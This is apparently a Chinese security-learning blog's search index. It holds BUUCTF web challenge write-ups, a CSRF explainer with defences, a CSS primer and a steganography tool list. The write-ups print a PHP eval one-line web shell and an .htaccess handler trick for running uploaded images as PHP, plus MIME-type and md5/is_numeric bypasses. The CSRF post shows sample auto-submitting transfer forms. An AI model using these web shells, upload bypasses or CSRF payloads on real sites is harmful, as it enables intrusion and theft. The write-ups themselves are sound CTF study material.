<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF_Web</title>
    <url>/post/282276cb.html</url>
    <content><![CDATA[<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先，先上传一句话木马文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php解析）。

然后，新建名字为”.htaccess“的文件，内容：

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p>通过BurpSuite修改content-type类型后，也上传成功</p>
<p>然后通过蚁剑访问链接：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">5</span>b<span class="number">54</span>f<span class="number">248</span>-<span class="number">571</span>b-<span class="number">4</span>dac-<span class="number">95</span>ea-fe<span class="number">0831</span>a<span class="number">863</span>de.node<span class="number">3</span>.buuoj.cn/upload/<span class="number">06</span>efab<span class="number">0</span>e<span class="number">29</span>ec<span class="number">5</span>f<span class="number">55</span>e<span class="number">0</span>e<span class="number">5</span>e<span class="number">3</span>d<span class="number">3</span>c<span class="number">7</span>e<span class="number">5</span>a<span class="number">424</span>/pass.jpg</span><br></pre></td></tr></table></figure>
<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><blockquote>
<p>.htaccess文件是什么         <a href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">原文传送门</a></p>
<p>　　.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
<p>　　概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>　　启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
<p>　　笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
</blockquote>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先，查看网站源码</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9MsH.jpg" alt="6s9MsH.jpg"></p>
<p>这个链接点击之后，发现</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9nzD.jpg" alt="6s9nzD.jpg">这时候我们看url链接</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9eJK.jpg" alt="6s9eJK.jpg"></p>
<p>我们推测是任意文件下载漏洞，我们知道GET和POST请求方式是有区别的，其中有一点就是GET传送数据量较小，收到URL长度限制，POST传送数据较大不受限制，所以我们使用BurpSuite拦截一下</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9KQe.jpg" alt="6s9KQe.jpg"></p>
<p>将GET改成POST然后在点击Forward，之后显示下载链接</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9mRO.jpg" alt="6s9mRO.jpg"></p>
<p>这个打开一看并不是我们想要的</p>
<h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>javaweb项目开发的结构目录</strong></p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB项目主要包含一下文件或目录:</span><br><span class="line">　　/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">　　/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">　　/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">　　/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">　　/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接<span class="title">class</span>文件，通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure>
<p>使用BurpSuite更改内容</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s93dI.jpg" alt="6s93dI.jpg"></p>
<p>将文件下载之后</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s98ot.jpg" alt="6s98ot.jpg"></p>
<p>知道了这个以后，我们可以使用BurpSuite进行更改，下载class源文件</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6s9QLd.jpg" alt="6s9QLd.jpg"></p>
<p>反编译的BASE64解密的到flag</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>　　打开靶机，我们根据提示，按住F12可以得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                    highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="知识补充-1"><a href="#知识补充-1" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL</p>
<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
<p><strong>md5加密</strong>，但是md5()函数无法操作数组，可以进行数组绕过。</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6ys11J.jpg" alt="6ys11J.jpg"></p>
<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。是则为true，我们可以使用1234567a绕过，1234567a是字符串，但是在弱比较的时候，1在前面，php会将其整体转成数字。<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">原文链接</a></p>
<p>所以完整的语句：</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6ys8XR.jpg" alt="6ys8XR.jpg"></p>
<p>可以拿到flag</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6yslp4.jpg" alt="6yslp4.jpg"></p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们先通过修改MIME类型上传一句话木马试试</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6ys3c9.jpg" alt="6ys3c9.jpg"></p>
<p>上传成功，但是这个时候我们还不能使用蚁剑连接成功，因为上传文件的后缀名是jpg，并不会把文件当做php文件执行，所以我们还用上一题的方法上传.htaccess文件，之后使用蚁剑连接，就在根目录下得到了flag</p>
<p><img src="https://s3.ax1x.com/2021/03/16/6ysMhF.jpg" alt="6ysMhF.jpg"></p>
<p><img src="https://s3.ax1x.com/2021/03/16/6yynKA.jpg" alt="6yynKA.jpg"></p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1>]]></content>
  </entry>
  <entry>
    <title>CSRF攻击</title>
    <url>/post/44b0db89.html</url>
    <content><![CDATA[<p>　　学习了这部分之后，我感觉之前qq空间链接的那种盗号方式，应该就是这个原理<span id="more"></span></p>
<h1 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h1><p>　　跨站请求伪造（Cross-site request forgery，CSRF），也被称为one click attack/session riding，通常缩写是CSRF/XSRF。</p>
<h1 id="2-CSRF可以做些什么"><a href="#2-CSRF可以做些什么" class="headerlink" title="2.CSRF可以做些什么"></a>2.CSRF可以做些什么</h1><p>　　可以简单理解为：<font color="ff0000">攻击者盗用了你的身份，以你的名义发送恶意请求</font>，它利用网站对用户网页浏览器的信任。如：转移资金、修改电子邮件地址、密码。    </p>
<h1 id="3-CSRF原理"><a href="#3-CSRF原理" class="headerlink" title="3.CSRF原理"></a>3.CSRF原理</h1><p>　　<font color="ff0000">受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</font></p>
<p>　　<font color="ff0000">黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</font></p>
<p>　　<font color="ff0000">这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </font></p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1xb59.png" alt="s1xb59.png"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Bob打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在Bob信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时Bob登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span>Bob未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span>这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">   src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=hacker</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span>浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在Bob不知情的情况下携带Cookie信息，根据用户的Cookie信息以Bob的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
<h1 id="4-CSRF攻击类型"><a href="#4-CSRF攻击类型" class="headerlink" title="4.CSRF攻击类型"></a>4.CSRF攻击类型</h1><h2 id="4-1-GET类型的CSRF"><a href="#4-1-GET类型的CSRF" class="headerlink" title="4.1 GET类型的CSRF"></a>4.1 GET类型的CSRF</h2><p>GET类型的CSRF利用非常简单，只需要HTTP请求，一般这样利用：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">![](https:<span class="regexp">//</span>awps-assets.meituan.net<span class="regexp">/mit-x/</span>blog-images-bundle-<span class="number">2018</span>b<span class="regexp">/ff0cdbee.example/</span>withdraw?amount=<span class="number">10000</span>&amp;<span class="keyword">for</span>=hacker)</span><br></pre></td></tr></table></figure>
<p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p>
<h2 id="4-2-POST类型的CSRF"><a href="#4-2-POST类型的CSRF" class="headerlink" title="4.2 POST类型的CSRF"></a>4.2 POST类型的CSRF</h2><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--自动提交表单--&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。POST类型的攻击通常比GET要求更加严格一点，但扔并不复杂。任何个人网站、博客，被黑客上传页面的往回走哪都有可能是发起攻击的来源。</p>
<h2 id="4-3-链接类型的CSRF"><a href="#4-3-链接类型的CSRF" class="headerlink" title="4.3 链接类型的CSRF"></a>4.3 链接类型的CSRF</h2><p>这种需要用户点击链接才会触发。这种类型通常是杂论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> taget=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">  &lt;a/&gt;</span><br></pre></td></tr></table></figure>
<p>由于之前用户登陆的信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，就表示攻击成功。</p>
<h1 id="5-CSRF的特点"><a href="#5-CSRF的特点" class="headerlink" title="5.CSRF的特点"></a>5.CSRF的特点</h1><ul>
<li>攻击一般发起在第三方网站，而不是被攻击的网站。</li>
<li>攻击利用受害者在被攻击网站的登陆凭证，冒充受害者提交操作。</li>
<li>整个过程攻击者并不能获取到受害者的登陆凭证，仅仅是冒用。</li>
</ul>
<h1 id="6-防护措施"><a href="#6-防护措施" class="headerlink" title="6.防护措施"></a>6.防护措施</h1><h2 id="6-1-验证HTTP-Referer字段"><a href="#6-1-验证HTTP-Referer字段" class="headerlink" title="6.1 验证HTTP Referer字段"></a>6.1 验证HTTP Referer字段</h2><p>HTTP头中有一个Referer的字段，它记录了该HTTP请求的来源网址</p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1xHUJ.png" alt="s1xHUJ.png"></p>
<p>　　也就是说，服务器会验证客户端的请求来源，如果是本网站请求的就响应，否则不响应。</p>
<p>　　正如上文所提到的，Bob必须登录银行网站，通过页面上的按钮触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。黑客只能在自己网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向黑客的网站。所以不能响应。</p>
<p>但是这种方式仍然<font color="ff000">存在安全隐患</font></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对于某些浏览器，比如IE6或FF2，目前已经有一些方法可以篡改Referer值</span><br><span class="line"><span class="number">2.</span>用户自己可以这只浏览器使其请求时不再提供Referer</span><br></pre></td></tr></table></figure>
<h2 id="6-2-使用token（Anti-CSRF-Token）"><a href="#6-2-使用token（Anti-CSRF-Token）" class="headerlink" title="6.2 使用token（Anti CSRF Token）"></a>6.2 使用token（Anti CSRF Token）</h2><p>可以理解为防伪</p>
<p>例子：</p>
<p>1.用户访问某个表单页面。</p>
<p>2.服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>
<p>3.在页面表单附带上Token参数。</p>
<p>4.用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的      Token一致，一致为合法请求，不是则非法请求。</p>
<p>　　这个Token的值必须是随机的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为<code>POST</code>，以form或AJAX形式提交，避免Token泄露。</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS学习</title>
    <url>/post/238675c9.html</url>
    <content><![CDATA[<p>基本了解CSS<span id="more"></span></p>
<h1 id="1-什么是CSS"><a href="#1-什么是CSS" class="headerlink" title="1.什么是CSS"></a>1.什么是CSS</h1><p>　　CSS（Cascading Style Sheet）：层叠样式表语言，它的作用是修饰HTML页面，设置HTML页面中的某些元素的样式。</p>
<h1 id="2-CSS实例"><a href="#2-CSS实例" class="headerlink" title="2.CSS实例"></a>2.CSS实例</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">P</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>:red;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="3-id和class选择器"><a href="#3-id和class选择器" class="headerlink" title="3.id和class选择器"></a>3.id和class选择器</h1><h2 id="3-1-id选择器"><a href="#3-1-id选择器" class="headerlink" title="3.1 id选择器"></a>3.1 id选择器</h2><p>　　可以为标有特定id的HTML元素指定特定的样式。HTML元素以id属性来设置id选择器，css中以“#”来定义。以下的央视规则应用于元素属性id=“para1”：</p>
<p><a href="https://www.runoob.com/try/try.php?filename=trycss_syntax_id">实例1</a></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#para1</span>&#123;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">	<span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-2-class选择器"><a href="#3-2-class选择器" class="headerlink" title="3.2 class选择器"></a>3.2 class选择器</h2><p>　　class选择器用于描述一组元素的样式，class选择器有别于id选择器，class可以在多个元素中使用。class选择器在HTML中以class属性表示，在CSS中，类选择器以一个点“.”号显示：</p>
<p>在以下例子中，所拥有center类的HTML元素均为居中。</p>
<p><a href="https://www.runoob.com/try/try.php?filename=trycss_syntax_class">实例2</a></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.center</span>&#123;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以指定特定的HTML元素使用class。在以下实例中，所有的p元素使用class=”center”让该元素的文本居中：</p>
<p><a href="https://www.runoob.com/try/try.php?filename=trycss_syntax_element_class">实例3</a></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.center</span>&#123;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="4-CSS的三种使用方式"><a href="#4-CSS的三种使用方式" class="headerlink" title="4.CSS的三种使用方式"></a>4.CSS的三种使用方式</h1><h2 id="4-1-内联定义方式"><a href="#4-1-内联定义方式" class="headerlink" title="4.1 内联定义方式"></a>4.1 内联定义方式</h2><p>在标签内部使用style属性来设置元素的CSS样式，语法格式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">style</span>=<span class="string">&quot;样式名：样式值;样式名：样式值;样式名：样式值;...&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-2-样式快方式"><a href="#4-2-样式快方式" class="headerlink" title="4.2 样式快方式"></a>4.2 样式快方式</h2><p>在head标签中使用style块，语法格式:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">		选择器&#123;</span><br><span class="line">			样式名：样式值;</span><br><span class="line">			样式名：样式值;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">		选择器&#123;</span><br><span class="line">			样式名：样式值;</span><br><span class="line">			样式名：样式值;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-3-链入外部样式表文件"><a href="#4-3-链入外部样式表文件" class="headerlink" title="4.3 链入外部样式表文件"></a>4.3 链入外部样式表文件</h2><p>直接引入css文件，语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css文件的路径&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端学习</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF隐写术工具</title>
    <url>/post/fa8f33cf.html</url>
    <content><![CDATA[<p>　　隐写术是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接受者之外的任何人知道信息的传递事件或内容。<span id="more"></span></p>
<h2 id="隐写术用到的工具"><a href="#隐写术用到的工具" class="headerlink" title="隐写术用到的工具"></a>隐写术用到的工具</h2><h3 id="1-16进制修改器"><a href="#1-16进制修改器" class="headerlink" title="1.16进制修改器"></a>1.16进制修改器</h3><h3 id="2-binwalk（Linux）"><a href="#2-binwalk（Linux）" class="headerlink" title="2.binwalk（Linux）"></a>2.binwalk（Linux）</h3><p>分析文件信息，用来查看文件中是否包含其他隐藏文件，简单用法：</p>
<p><code>binwalk filename</code> 分析构成</p>
<p><code>binwalk -e filename</code>自动解压已知文件格式</p>
<p><code>binwalk -D=[extension] filename</code>根据后缀名解压，如-D=zip等</p>
<h3 id="3-StegSolve（Windows）"><a href="#3-StegSolve（Windows）" class="headerlink" title="3.StegSolve（Windows）"></a>3.StegSolve（Windows）</h3><p>能够对常见的照片格式进行偏移、LSB提取、帧提取、拉长等</p>
<h3 id="4-Stegdetect（Windows）"><a href="#4-Stegdetect（Windows）" class="headerlink" title="4.Stegdetect（Windows）"></a>4.Stegdetect（Windows）</h3><p>用于检测JPEG文件中是否包含隐藏内容，并尝试分析是哪个工具嵌入的，使用方式：</p>
<p><code>stegdetect [-nqV] [-s &lt;float&gt;] [-d &lt;num&gt;] [-t &lt;tests&gt;] [file.jpg]</code></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>-q 仅显示可能包含隐藏内容的图像。</td>
</tr>
<tr>
<td>-n 启用检查 JPEG 文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果 JPEG 文件的 JFIF 标识符中的版本号不是1.1，则禁用 OutGuess 检测。</td>
</tr>
<tr>
<td>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</td>
</tr>
<tr>
<td>-d 打印带行号的调试信息。</td>
</tr>
<tr>
<td>-t 设置要检测哪些隐写工具（默认检测 jopi），可设置的选项如下： j 检测图像中的信息是否是用 jsteg 嵌入的。 o  检测图像中的信息是否是用 outguess 嵌入的。 p 检测图像中的信息是否是用 jphide 嵌入的。 i 检测图像中的信息是否是用  invisible secrets 嵌入的。</td>
</tr>
</tbody>
</table>
</div>
<h3 id="5-Outguess（Windows）"><a href="#5-Outguess（Windows）" class="headerlink" title="5.Outguess（Windows）"></a>5.Outguess（Windows）</h3><p>提取JPEG文件中使用Outguess算法的加入的隐藏信息</p>
<h3 id="6-MP3Stego（Windows）"><a href="#6-MP3Stego（Windows）" class="headerlink" title="6.MP3Stego（Windows）"></a>6.MP3Stego（Windows）</h3><p>对于MP3音频文件的隐写和提取，如一个名为“123.mp3”的文件</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>decode -X -P 123.mp3</td>
<td>提取123mp3信息到123.txt中</td>
</tr>
<tr>
<td>encode -E 123.txt -P pass 123.mp3</td>
<td>把123.txt文件写入123.mp3中</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://www.petitcolas.net/steganography/mp3stego/">下载链接</a></p>
<h3 id="7-ZipCenOp伪加密（Windows）"><a href="#7-ZipCenOp伪加密（Windows）" class="headerlink" title="7.ZipCenOp伪加密（Windows）"></a>7.ZipCenOp伪加密（Windows）</h3><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>java -jar ZipCenOp.jar e xxx.zip</td>
<td>加密</td>
</tr>
<tr>
<td>java -jar ZipCenOp.jar r xxx.zip</td>
<td>解密</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://s3.ax1x.com/2020/11/29/D6LBon.jpg" alt="D6LBon.jpg"></p>
